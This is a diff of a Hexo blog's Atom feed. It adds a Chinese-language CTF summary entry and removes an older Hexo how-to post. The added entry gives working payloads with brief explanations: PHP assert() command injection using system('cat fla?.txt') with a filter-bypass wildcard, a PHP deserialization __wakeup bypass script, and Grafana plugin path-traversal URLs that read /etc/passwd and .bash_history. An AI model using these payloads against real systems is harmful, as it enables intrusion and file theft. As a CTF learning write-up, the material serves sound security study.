@@ -6,7 +6,7 @@
   <link href="https://liu1272.github.io/atom.xml" rel="self"/>
   
   <link href="https://liu1272.github.io/"/>
-  <updated>2022-11-06T09:25:05.087Z</updated>
+  <updated>2022-11-06T14:20:06.450Z</updated>
   <id>https://liu1272.github.io/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>20221106CTF总结</title>
+    <link href="https://liu1272.github.io/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/"/>
+    <id>https://liu1272.github.io/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/</id>
+    <published>2022-11-06T13:57:22.000Z</published>
+    <updated>2022-11-06T14:20:06.450Z</updated>
+    
+    <content type="html"><![CDATA[<h5 id="404页面"><a href="#404页面" class="headerlink" title="404页面:"></a>404页面:</h5><p>url+404/</p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h5><pre><code>&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if($_GET[&#39;c&#39;] === &quot;flag&quot;)&#123;            如果 c=flag 的话，会看到 flag.php 文件        highlight_file(&quot;flag.php&quot;);    &#125;    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;       正则匹配过滤 flag 字符        $page = $_GET[&#39;c&#39;];    &#125;    assert(&quot;file_exists(&#39;$page&#39;)&quot;);           assert 函数&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;利用assert函数的特性，实现命令执行assert函数里面的参数为字符串时，会将字符串当做php命令来执行。assert(&#39;phpinfo()&#39;)=&lt;?php phpinfo()?&gt;构造闭合函数，使 assert 函数执行系统命令为还过滤了 flag 字符，使用?匹配符绕过Payload：?c=1&#39;) or system(&#39;ls?c=1&#39;) or system(&#39;cat fla?.txt</code></pre><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>construct()：构造函数/方法，是类中的一种特殊函数,当使用 new 关键字实例化一个对象时,构造函数将会自动调用<br>wakeup( )函数是在 php 在使用反序列化函数 unserialize()时，会自动调用的函数，只要序列化的中的成员数大于实际成员数，即可绕过<br>destruct()函数是在对象被销毁时才会被调用，可以注意到flag.php文件，需password=666绕过第一个if，username等于usernames才能够输出flag文件；<br>参数需要进行 base64 加密<br>Payload：<br>&lt;?php<br>class Name{<br> private $username = ‘usernames’;<br> private $password = ‘666’;<br>}<br>$select = serialize(new Name());<br>$select = str_replace(‘:2:’,’:3:’,$select);<br>echo base64_encode($select);</p><h5 id="grafana漏洞"><a href="#grafana漏洞" class="headerlink" title="grafana漏洞"></a>grafana漏洞</h5><p>抓包根据漏洞的原理，构造 payload 路径，进行任意文件读取<br>/public/plugins/alertlist/../../../../../../../../../etc/pa<br>sswd<br>看到系统的配置文件，存在哪些用户<br>linux 的历史记录文件.bash_history<br>构造 payload:<br>/public/plugins/alertlist/../../../../../../../../../home/grafana/.bash_history</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h5 id=&quot;404页面&quot;&gt;&lt;a href=&quot;#404页面&quot; class=&quot;headerlink&quot; title=&quot;404页面:&quot;&gt;&lt;/a&gt;404页面:&lt;/h5&gt;&lt;p&gt;url+404/&lt;/p&gt;
+&lt;h5 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;header</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>20221105</title>
@@ -464,29 +485,6 @@
       
       
     <summary type="html">&lt;h5 id=&quot;深入了解Hexo搭建博客的底层原理&quot;&gt;&lt;a href=&quot;#深入了解Hexo搭建博客的底层原理&quot; class=&quot;headerlink&quot; title=&quot;深入了解Hexo搭建博客的底层原理&quot;&gt;&lt;/a&gt;深入了解Hexo搭建博客的底层原理&lt;/h5&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;</summary>
-      
-    
-    
-    
-    
-    <category term="学术" scheme="https://liu1272.github.io/tags/%E5%AD%A6%E6%9C%AF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>试验</title>
-    <link href="https://liu1272.github.io/2022/10/04/a/"/>
-    <id>https://liu1272.github.io/2022/10/04/a/</id>
-    <published>2022-10-04T08:07:13.000Z</published>
-    <updated>2022-10-04T08:43:36.240Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="http://t.csdn.cn/FwpOt">写作教程总结</a></p><h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>hexo server</p><h1 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h1><p>hexo new a</p><h1 id="新建草稿"><a href="#新建草稿" class="headerlink" title="新建草稿"></a>新建草稿</h1><p>hexo new draft b</p><h1 id="发布草稿成为文章"><a href="#发布草稿成为文章" class="headerlink" title="发布草稿成为文章"></a>发布草稿成为文章</h1><p>hexo publish b</p><h1 id="发布关于"><a href="#发布关于" class="headerlink" title="发布关于"></a>发布关于</h1><p>hexo new page c</p><h1 id="生成静态文章"><a href="#生成静态文章" class="headerlink" title="生成静态文章"></a>生成静态文章</h1><p>hexo generate 或者是 hexo g</p><h1 id="部署文章"><a href="#部署文章" class="headerlink" title="部署文章"></a>部署文章</h1><p>hexo deploy 或者是 hexo d</p><p>Markdowm语法:<a href="http://t.csdn.cn/BJSXy">教程</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://t.csdn.cn/FwpOt&quot;&gt;写作教程总结&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&quot;开启服务&quot;&gt;&lt;a href=&quot;#开启服务&quot; class=&quot;headerlink&quot; title=&quot;开启服务&quot;&gt;&lt;/a&gt;开启服务&lt;/h1&gt;&lt;p&gt;hexo server</summary>
       
     
     
